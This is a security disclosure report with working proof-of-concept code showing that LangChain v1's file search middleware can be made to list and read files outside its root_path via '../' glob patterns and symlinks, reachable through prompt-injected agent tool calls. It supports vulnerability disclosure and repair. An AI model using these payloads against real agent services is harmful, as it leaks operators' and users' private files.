# PoC Report: `FilesystemFileSearchMiddleware` root_path bypass in LangChain v1

## Summary

`FilesystemFileSearchMiddleware` in LangChain v1 exposes two file search tools,
`glob_search` and `grep_search`, intended to operate only under the configured
`root_path`. The implementation validates the `path` argument, but it does not
validate path traversal inside the `pattern` argument passed to `Path.glob()`.

As a result, an attacker who can influence agent tool-call arguments can use a glob
pattern such as `../*` or `../outside_secret.txt` to enumerate files outside the
configured `root_path`.

Additionally, when `grep_search` uses its Python fallback implementation, it follows
symlinks inside `root_path` and reads the symlink target without checking whether the
resolved target is still under `root_path`. This can disclose contents of files
outside `root_path` when a symlink to such a file exists inside the workspace.

## Affected Component

- Package: `langchain`
- Audited package path: `libs/langchain_v1`
- Version in audited tree: `1.2.15`
- Affected file: `libs/langchain_v1/langchain/agents/middleware/file_search.py`
- Tested commit: `8182d6302dc81bc62849f9aa88ff698489b0e665`

## Security Impact

If an application uses `FilesystemFileSearchMiddleware(root_path=...)` as a file
access boundary, a model-controlled or prompt-injection-controlled tool call can bypass
that boundary.

Impact depends on deployment:

- `glob_search`: can enumerate file names outside `root_path`.
- `grep_search`: can disclose file contents outside `root_path` when Python fallback is
  used and a symlink inside `root_path` points to the outside file.

This is most relevant for multi-user or remote agent services where each user/session is
supposed to be restricted to a workspace directory.

Likely CWE mappings:

- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
- CWE-59: Improper Link Resolution Before File Access
- CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

## Exploit Preconditions

For `glob_search` path traversal:

1. The service uses `FilesystemFileSearchMiddleware(root_path=...)`.
2. The middleware tools are exposed to an agent through `create_agent()`.
3. The attacker can influence the model's tool-call arguments, for example through a
   chat prompt or prompt injection.
4. Tool outputs are returned to the attacker or included in subsequent model output.

For `grep_search` content disclosure:

1. The above conditions are true.
2. `grep_search` uses the Python fallback path. This occurs when:
   - `use_ripgrep=False`, or
   - `use_ripgrep=True` but `rg` is unavailable or not on `PATH`.
3. A symlink exists inside `root_path` that points to a file outside `root_path`.
4. The service process has permission to read the symlink target.

## Root Cause

`_validate_and_resolve_path()` validates only the `path` argument:

```python
def _validate_and_resolve_path(self, path: str) -> Path:
    if not path.startswith("/"):
        path = "/" + path

    if ".." in path or "~" in path:
        raise ValueError("Path traversal not allowed")

    relative = path.lstrip("/")
    full_path = (self.root_path / relative).resolve()
    full_path.relative_to(self.root_path)
    return full_path
```

However, `glob_search()` later passes attacker-controlled `pattern` directly to
`Path.glob()`:

```python
base_full = self._validate_and_resolve_path(path)
for match in base_full.glob(pattern):
    if match.is_file():
        virtual_path = "/" + str(match.relative_to(self.root_path))
```

Because `pattern` is not validated, this bypasses the `path` validation:

```text
path="/"
pattern="../outside_secret.txt"
```

The effective search path becomes:

```text
<root_path>/../outside_secret.txt
```

For `grep_search`, the Python fallback walks files and reads them directly:

```python
for file_path in base_full.rglob("*"):
    if not file_path.is_file():
        continue

    if file_path.stat().st_size > self.max_file_size_bytes:
        continue

    content = file_path.read_text()
```

`stat()` and `read_text()` follow symlinks. The resolved target is not checked against
`self.root_path` before reading.

## PoC 1: Direct local reproduction

This PoC does not require any external LLM provider. It creates:

- a workspace directory used as `root_path`;
- a secret file outside that workspace;
- a symlink inside the workspace pointing to the outside secret.

```python
from pathlib import Path
import os
import tempfile

from langchain.agents.middleware.file_search import FilesystemFileSearchMiddleware

base = Path(tempfile.mkdtemp(prefix="lc_file_search_poc_"))
root = base / "workspace"
root.mkdir()

outside = base / "outside_secret.txt"
outside.write_text("TOKEN=top-secret-value\n", encoding="utf-8")
(root / "inside.txt").write_text("normal workspace file\n", encoding="utf-8")
(root / "secret_link.txt").symlink_to(outside)

mw = FilesystemFileSearchMiddleware(root_path=str(root))

print(f"root_path = {root}")
print(f"outside_file = {outside}")

print("\n[1] glob_search path traversal")
print(mw.glob_search.func(pattern="../*", path="/"))

print("\n[2] grep_search content disclosure via Python fallback")
old_path = os.environ.get("PATH", "")
os.environ["PATH"] = ""  # simulate no rg; default code falls back to Python search
try:
    print(mw.grep_search.func(pattern="TOKEN=", output_mode="content"))
finally:
    os.environ["PATH"] = old_path
```

Expected vulnerable output:

```text
[1] glob_search path traversal
/../outside_secret.txt

[2] grep_search content disclosure via Python fallback
/secret_link.txt:1:TOKEN=top-secret-value
```

The `/../outside_secret.txt` result demonstrates that `glob_search` returned a file
outside the virtual root. The `grep_search` result demonstrates content disclosure via a
symlink inside `root_path`.

## PoC 2: End-to-end LangChain agent reproduction

This PoC validates that the issue is reachable through the normal agent execution path:

```text
create_agent() -> model tool call -> ToolNode -> FilesystemFileSearchMiddleware
```

The model below is deterministic and local. It replaces an external LLM only to make the
tool call reproducible without API keys.

```python
from pathlib import Path
import sys
import tempfile

sys.path.insert(0, "/home/yangwei/langc/langchain/libs/langchain_v1/tests/unit_tests/agents")
from model import FakeToolCallingModel

from langchain.agents import create_agent
from langchain.agents.middleware import FilesystemFileSearchMiddleware
from langchain_core.messages import HumanMessage

base = Path(tempfile.mkdtemp(prefix="lc_agent_e2e_poc_"))
root = base / "workspace"
root.mkdir()

outside = base / "outside_secret.txt"
outside.write_text("TOKEN=agent-e2e-secret\n", encoding="utf-8")
(root / "inside.txt").write_text("normal workspace file\n", encoding="utf-8")
(root / "secret_link.txt").symlink_to(outside)

glob_model = FakeToolCallingModel(tool_calls=[[
    {
        "name": "glob_search",
        "args": {"pattern": "../outside_secret.txt", "path": "/"},
        "id": "call_glob",
    }
], []])

glob_agent = create_agent(
    model=glob_model,
    middleware=[FilesystemFileSearchMiddleware(root_path=str(root))],
)

glob_result = glob_agent.invoke({"messages": [HumanMessage(content="find files")]})
for msg in glob_result["messages"]:
    if msg.type == "tool":
        print(msg.name, msg.content)

grep_model = FakeToolCallingModel(tool_calls=[[
    {
        "name": "grep_search",
        "args": {"pattern": "TOKEN=", "path": "/", "output_mode": "content"},
        "id": "call_grep",
    }
], []])

grep_agent = create_agent(
    model=grep_model,
    middleware=[FilesystemFileSearchMiddleware(root_path=str(root), use_ripgrep=False)],
)

grep_result = grep_agent.invoke({"messages": [HumanMessage(content="search content")]})
for msg in grep_result["messages"]:
    if msg.type == "tool":
        print(msg.name, msg.content)
```

Observed output:

```text
glob_search /../outside_secret.txt
grep_search /secret_link.txt:1:TOKEN=agent-e2e-secret
```

## PoC 3: HTTP service and exploit client

The following files provide a realistic HTTP reproduction:

- `security_pocs/vulnerable_file_search_service.py`
- `security_pocs/exploit_file_search_service.py`

The service creates a real LangChain agent:

```python
AGENT = create_agent(
    model=PromptDirectedToolCallModel(),
    middleware=[
        FilesystemFileSearchMiddleware(
            root_path=str(ROOT_PATH),
            use_ripgrep=False,
        )
    ],
)
```

`PromptDirectedToolCallModel` is a deterministic local `BaseChatModel` used only to
simulate a model being induced to emit attacker-controlled tool calls. The vulnerable
file search middleware and agent execution path are real.

### Run the service

```bash
cd /home/yangwei/langc/langchain
python3 -m venv /tmp/lc_v1_audit_venv
. /tmp/lc_v1_audit_venv/bin/activate
python -m pip install --upgrade pip
python -m pip install -e libs/core -e libs/langchain_v1
python security_pocs/vulnerable_file_search_service.py
```

The service prints paths similar to:

```text
root_path=/tmp/lc_vulnerable_service_xxxxxx/workspace
outside_secret=/tmp/lc_vulnerable_service_xxxxxx/outside_secret.txt
listening=http://127.0.0.1:8765
```

### Run the exploit

In another terminal:

```bash
cd /home/yangwei/langc/langchain
. /tmp/lc_v1_audit_venv/bin/activate
python security_pocs/exploit_file_search_service.py http://127.0.0.1:8765
```

Observed output:

```text
target=http://127.0.0.1:8765

[glob_search traversal]
glob_search: /../outside_secret.txt

[grep_search symlink disclosure]
grep_search: /secret_link.txt:1:SERVICE_SECRET=langchain-v1-file-search-leak

EXPLOIT_SUCCESS: leaked root_path-external file content
```

The exploit client only sends HTTP requests to `/chat`. It does not import or call
`FilesystemFileSearchMiddleware` directly.

## Recommended Remediation

1. Validate all path-bearing inputs, not just the `path` argument.
2. Reject glob patterns containing:
   - `..`
   - absolute paths
   - `~`
   - null bytes
   - newlines
3. After every `Path.glob()` match, resolve the match and require containment:

```python
resolved = match.resolve()
resolved.relative_to(self.root_path)
```

4. In `_python_search()`, resolve every candidate before `stat()` or `read_text()` and
   skip candidates whose resolved path is outside `self.root_path`.
5. Define and enforce a symlink policy. If symlinks are not intended, skip them with
   `is_symlink()` or use `lstat()`-based checks.
6. Add regression tests for:
   - `glob_search(pattern="../secret.txt", path="/")`
   - `glob_search(pattern="../*", path="/")`
   - `grep_search()` Python fallback reading a symlink to a root-external file
   - default fallback behavior when `rg` is unavailable

## Suggested Report Title

```text
FilesystemFileSearchMiddleware root_path bypass via unchecked glob pattern and symlink-following grep fallback
```

## Suggested Severity

Suggested severity: Medium.

Rationale:

- The issue bypasses a documented/configured file search boundary.
- Impact can include root-external file name disclosure and, under additional symlink
  and fallback conditions, root-external file content disclosure.
- Exploitability depends on an application exposing the middleware tools to an agent and
  allowing attacker-influenced tool calls.
